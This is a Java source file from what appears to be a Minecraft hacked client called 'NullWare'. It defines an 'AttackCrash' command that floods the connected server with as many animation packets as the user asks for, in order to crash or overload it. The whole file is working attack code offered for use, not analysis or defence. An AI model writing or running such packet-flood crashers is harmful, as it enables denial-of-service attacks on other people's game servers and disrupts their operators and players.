package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C0APacketAnimation;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class AttackCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        long start = System.currentTimeMillis();
        sendMessage(String.format("Sending &8[&7Method: &d%s&7, Packets: &d%s&8]", "Attack", packets));
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C0APacketAnimation());
        }
        sendMessage(String.format("Sent &8[&7Method: &d%s&7, Time: &d%sms&8]", "Attack", System.currentTimeMillis() - start));
    }
}